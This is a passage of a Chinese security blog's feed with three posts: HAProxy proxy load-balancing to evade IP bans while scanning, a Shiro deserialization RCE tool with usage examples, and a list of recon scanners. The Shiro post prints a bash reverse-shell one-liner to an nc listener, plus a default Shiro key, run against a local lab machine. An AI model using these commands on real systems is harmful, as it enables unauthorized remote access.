&quot;obfs_param&quot;: &quot;xxxx&quot;&#125;</code></pre><p>接下来，重启酸酸乳，使用 curl 进行一下测试。</p><pre><code class="bash">curl --socks5-hostname 127.0.0.1:1080 cip.cc</code></pre><pre><code class="bash">root@ubuntu:~# curl --socks5-hostname 127.0.0.1:1080 cip.ccIP      : 200.xxx.xxx.41……省略……root@ubuntu:~# curl --socks5-hostname 127.0.0.1:1080 cip.ccIP      : 200.xxx.xxx.48……省略……root@ubuntu:~# curl --socks5-hostname 127.0.0.1:1080 cip.ccIP      : 200.xxx.xxx.42……省略……</code></pre><p>通过测试，可以发现每次请求时，自己的 IP 都会改变，这就是 HAProxy 起到了作用。</p><p>这里只是进行一下测试，平时在<code>Linux</code>下使用代理的时候，更推荐使用<code>proxychains4</code>对命令进行代理。</p><h2 id="一些注意事项"><a href="#一些注意事项" class="headerlink" title="一些注意事项"></a>一些注意事项</h2><ul><li>在修改代理客户端的代理配置文件之前，一定要确保当前配置文件是没问题的，以便于后期排错。</li><li>只有代理客户端的配置文件是配置的 HAProxy 服务IP端口信息，其他比如浏览器、curl 等都是和原来一样代理到代理工具的 IP、端口上即可，这个是我陷的比较深的一个坑。</li></ul><h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>在平时不管挖洞还是扫描、爬虫，个人觉着开启负载均衡之后，在一定程度上应该是能降低被封 IP 的风险的，同时代理质量也能上去。</p><p>但是在涉及账号登录情况下，就建议不要开启负载均衡了，不然有的系统监测到异地登录就会把账号退出了，手动登录之后，发现系统又检测到了异地登录，然后又给账号退出了……</p><p>总的来说，以上就是我个人的一些小总结以及踩过的一些坑，希望大家碰到同类问题时，这篇文章能够对其有所帮助。</p><blockquote><p>参考链接：</p><p><a href="https://44i.im/index.php/2020/02/10/ss-ssr-v2ray-balance/">https://44i.im/index.php/2020/02/10/ss-ssr-v2ray-balance/</a></p><p><a href="https://tianws.github.io/skill/2019/07/11/gfw/">https://tianws.github.io/skill/2019/07/11/gfw/</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;在平时进行一些挖洞、扫描或者爬虫工作的时候，被封 IP 的情况时有发生，解决这个问题较好的方法可能就是挂代理了。但是代理有时也会被封，并且有的代理质量可能还不太高，这时采用负载均衡个人觉着是一种不错的解决方法。&lt;/p&gt;
&lt;p&gt;在开启负载均衡时，系统能够自动切换到较为优质的代理线路上；同时由于系统经常自动切换 IP ，因此个人觉着也能在一定程度上减轻被封 IP 的风险。&lt;/p&gt;</summary>
    
    
    
    <category term="经验总结" scheme="https://www.teamssix.com/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="经验总结" scheme="https://www.teamssix.com/tags/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
    
    <category term="代理" scheme="https://www.teamssix.com/tags/%E4%BB%A3%E7%90%86/"/>
    
    <category term="负载均衡" scheme="https://www.teamssix.com/tags/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1/"/>
    
  </entry>
  
  <entry>
    <title>【工具分享】shiro漏洞检测RCE工具</title>
    <link href="https://www.teamssix.com/year/200619-233603.html"/>
    <id>https://www.teamssix.com/year/200619-233603.html</id>
    <published>2020-06-19T15:36:03.000Z</published>
    <updated>2020-09-20T06:52:08.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>最近在做shiro反序列化漏洞复现，从网上也找了一堆复现文章和工具，但是这些工具用着都不太舒服，于是参考网上大佬们的工具，自己进行了一些简单的改良。</p><a id="more"></a><h1 id="0x01-工具安装"><a href="#0x01-工具安装" class="headerlink" title="0x01 工具安装"></a>0x01 工具安装</h1><p>本工具需要 Python3 和 Java 环境，下载本工具后，将文件解压，在本项目目录下运行下面的命令，安装Python第三方库即可。</p><pre><code>pip3 install -r requirements.txt</code></pre><p>国外下载地址：<a href="https://github.com/teamssix/shiro-check-rce/releases/">https://github.com/teamssix/shiro-check-rce/releases/</a></p><p>国内下载地址：<a href="https://gitee.com/teamssix/shiro-check-rce/releases">https://gitee.com/teamssix/shiro-check-rce/releases</a></p><h1 id="0x02-工具介绍"><a href="#0x02-工具介绍" class="headerlink" title="0x02 工具介绍"></a>0x02 工具介绍</h1><pre><code>   _____ __    _               ________              __      ____  ____________  / ___// /_  (_)________     / ____/ /_  ___  _____/ /__   / __ \/ ____/ ____/  \__ \/ __ \/ / ___/ __ \   / /   / __ \/ _ \/ ___/ //_/  / /_/ / /   / __/    ___/ / / / / / /  / /_/ /  / /___/ / / /  __/ /__/ ,&lt;    / _, _/ /___/ /___   /____/_/ /_/_/_/   \____/   \____/_/ /_/\___/\___/_/|_|  /_/ |_|\____/_____/   By TeamsSix我的个人博客：teamssix.com我的个人公众号：TeamsSix-c ：输入要执行的命令-h ：查看帮助-k : 输入自定义的key，不输入此参数时将遍历尝试默认key-t ：输入你的ceye.io的token，用于检测shiro漏洞是否存在，此选项需要配合 -c &quot;ping your.ceye.io&quot; 使用-u ：指定URLpython3 shiro-check-rce.py (-c) &lt;command&gt; [-h] [-k] &lt;key&gt; [-t] &lt;token&gt; (-u) &lt;url&gt;</code></pre><h2 id="1、漏洞检测"><a href="#1、漏洞检测" class="headerlink" title="1、漏洞检测"></a>1、漏洞检测</h2><p>该功能需要你有一个<a href="http://ceye.io/">http://ceye.io/</a>的账号，在<a href="http://ceye.io/profile">http://ceye.io/profile</a>页面，找到自己的<code>Identifier</code>值和<code>API Token</code>值。</p><p>使用 -t 和 -c 参数配合使用，即可调用默认key字典进行检测。</p><blockquote><p>文中的 <a href="http://192.168.175.146:8080/">http://192.168.175.146:8080/</a> 为本地靶机，192.168.175.152:9527 为 nc 监听地址。</p></blockquote><pre><code>python3 shiro-check-rce.py -u &#123;target_URL&#125; -c &quot;ping &#123;your.ceye.io&#125;&quot; -t &#123;your_token&#125;示例：python3 shiro-check-rce.py -u http://192.168.175.146:8080/ -c &quot;ping txxxxd.ceye.io&quot; -t 1xxxxxxxxxxxxx6</code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-06-19_22-21-10.png"></p><p>如果你有自己的key，也可以使用 -k 参数进行指定。</p><pre><code>python3 shiro-check-rce.py -u &#123;target_URL&#125; -c &quot;ping &#123;your.ceye.io&#125;&quot; -t &#123;your_token&#125; -k &#123;key&#125;示例：python3 shiro-check-rce.py -u http://192.168.175.146:8080/ -c &quot;ping txxxxd.ceye.io&quot; -t 1xxxxxxxxxxxxx6 -k kPH+bIxk5D2deZiIxcaaaA==</code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-06-19_22-27-47.png"></p><h2 id="2、反弹shell"><a href="#2、反弹shell" class="headerlink" title="2、反弹shell"></a>2、反弹shell</h2><p>这里我采用bash命令反弹到本地nc监听端口的方式，因此我这里需要先在本地建立一个 nc 监听端口。</p><pre><code>nc -lvvp 9527</code></pre><p>之后，执行反弹shell命令</p><pre><code>bash -i &gt;&amp; /dev/tcp/&#123;your_nc_ip&#125;/&#123;your_nc_port&#125; 0&gt;&amp;1示例：bash -i &gt;&amp; /dev/tcp/192.168.175.152/9527 0&gt;&amp;1</code></pre><p>本工具会对输入命令进行识别，如果检测到用户输入了bash反弹shell命令，将会自动对命令进行编码，无需自己编码，避免了明明存在漏洞却因为编码问题而反弹不了shell的尴尬。</p><pre><code>python3 shiro-check-rce.py -u &#123;target_URL&#125; -c &quot;bash -i &gt;&amp; /dev/tcp/&#123;your_nc_ip&#125;/&#123;your_nc_port&#125; 0&gt;&amp;1&quot;示例：python3 shiro-check-rce.py -u http://192.168.175.146:8080/ -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.175.152/9527 0&gt;&amp;1&quot;</code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/65_shiro_bash_shell.gif"></p><p>如果知道key的话，就直接 -k 指定 key 即可</p><pre><code>python3 shiro-check-rce.py -u &#123;target_URL&#125; -c &quot;bash -i &gt;&amp; /dev/tcp/&#123;your_nc_ip&#125;/&#123;your_nc_port&#125; 0&gt;&amp;1&quot; -k &#123;key&#125;示例：python3 shiro-check-rce.py -u http://192.168.175.146:8080/ -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.175.152/9527 0&gt;&amp;1&quot; -k kPH+bIxk5D2deZiIxcaaaA==</code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/65_shiro_bash_shell_key.gif"></p><h1 id="0x03-注意事项"><a href="#0x03-注意事项" class="headerlink" title="0x03 注意事项"></a>0x03 注意事项</h1><ul><li>本程序需要 python3 环境以及 java环境</li><li>在进行漏洞检测时，-c 指定 ping 的 URL 和 -t 指定的 token 需要是同一 ceye 账户的。</li><li>在安装<code>pycryptodome</code>库时，可能会碰到一些问题，可以根据报错信息进行排查，或者到网上找寻相关资料</li></ul><blockquote><p>更多信息欢迎关注我的微信公众号：TeamsSix</p><p>GitHub项目地址：<a href="https://github.com/teamssix/shiro-check-rce/">https://github.com/teamssix/shiro-check-rce/</a></p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;最近在做shiro反序列化漏洞复现，从网上也找了一堆复现文章和工具，但是这些工具用着都不太舒服，于是参考网上大佬们的工具，自己进行了一些简单的改良。&lt;/p&gt;</summary>
    
    
    
    <category term="工具分享" scheme="https://www.teamssix.com/categories/%E5%B7%A5%E5%85%B7%E5%88%86%E4%BA%AB/"/>
    
    
    <category term="漏洞检测" scheme="https://www.teamssix.com/tags/%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/"/>
    
    <category term="shiro" scheme="https://www.teamssix.com/tags/shiro/"/>
    
    <category term="RCE" scheme="https://www.teamssix.com/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>【工具分享】分享几个平时经常用到的小工具</title>
    <link href="https://www.teamssix.com/year/200613-134525.html"/>
    <id>https://www.teamssix.com/year/200613-134525.html</id>
    <published>2020-06-13T05:45:25.000Z</published>
    <updated>2020-06-13T05:54:02.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>平时自己偶然会根据需要写点小工具，但是一直没上传到我的Github上（其实是因为太懒），今天把一些自己平时使用比较频繁的一些小工具上传到我的Github上，有问题的可以反馈，有喜欢的可以给个Star，嘿嘿。</p><a id="more"></a><h1 id="小工具"><a href="#小工具" class="headerlink" title="小工具"></a>小工具</h1><h2 id="dirsearch-single"><a href="#dirsearch-single" class="headerlink" title="dirsearch-single"></a>dirsearch-single</h2><p>地址：<a href="https://github.com/teamssix/dirsearch-single">https://github.com/teamssix/dirsearch-single</a></p><p>介绍：在平时会碰到一个目标的多个资产都是使用的同一个CMS，当发现了一个站点的漏洞时，可能其他站点也存在此漏洞，此时就可以对这些URL进行单个目录的批量检测了。</p><h2 id="fckeditor-dircheck"><a href="#fckeditor-dircheck" class="headerlink" title="fckeditor-dircheck"></a>fckeditor-dircheck</h2><p>地址：<a href="https://github.com/teamssix/fckeditor-dircheck">https://github.com/teamssix/fckeditor-dircheck</a></p><p>介绍：此工具主要对fckeditor编辑器的上传路径进行检测，目录字典为<code>dir_fckeditor.txt</code>，各位大佬也可以根据自己需求、经验进行字典的添加。</p><h2 id="http-sys-check"><a href="#http-sys-check" class="headerlink" title="http.sys-check"></a>http.sys-check</h2><p>地址：<a href="https://github.com/teamssix/http.sys-check">https://github.com/teamssix/http.sys-check</a></p><p>介绍：由于在网上没有找到合适的批量检测http.sys漏洞的工具，于是自己简单写了一个，在这里分享出来。</p><h2 id="springboot-check"><a href="#springboot-check" class="headerlink" title="springboot-check"></a>springboot-check</h2><p>地址：<a href="https://github.com/teamssix/springboot-check">https://github.com/teamssix/springboot-check</a></p><p>介绍：由于在网上没有找到满意的springboot敏感目录检测的工具，于是就自己简单写了一个，dir_springboot.txt为检测的字典，都是从网上收集来的，各位大佬也可以自己根据自己需要进行添加。</p><h2 id="url-survival-check"><a href="#url-survival-check" class="headerlink" title="url-survival-check"></a>url-survival-check</h2><p>地址：<a href="https://github.com/teamssix/url-survival-check">https://github.com/teamssix/url-survival-check</a></p><p>介绍：由于平时在做资产梳理的时候，往往会遇到对大量URL进行存活检测的工作，有时候有的URL使用http能打开，有的则使用https才能打开，手动去检测效率太低，因此简单写了一个批量检测工具。</p><h1 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h1><p>上面这些工具由于主要是平时自己使用，因此写的比较粗糙。各位大佬在使用过程中，如果碰到Bug，可以在Github上进行反馈。</p><p>除了上述工具外，还有一些工具因为存在的Bug比较多、误报率较高而没有上传到我的Github上，后期等成熟的时候，会一一上传上去。</p><p>如果上面的工具有帮助到你，欢迎给个star或Github的关注，最后祝各位大佬HW顺利。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;平时自己偶然会根据需要写点小工具，但是一直没上传到我的Github上（其实是因为太懒），今天把一些自己平时使用比较频繁的一些小工具上传到我的Github上，有问题的可以反馈，有喜欢的可以给个Star，嘿嘿。&lt;/p&gt;</summary>
    
    
    
    <category term="工具分享" scheme="https://www.teamssix.com/categories/%E5%B7%A5%E5%85%B7%E5%88%86%E4%BA%AB/"/>
    
    
    <category term="工具分享" scheme="https://www.teamssix.com/tags/%E5%B7%A5%E5%85%B7%E5%88%86%E4%BA%AB/"/>
    
    <category term="Github" scheme="https://www.teamssix.com/tags/Github/"/>
    
  </entry>
  
</feed>
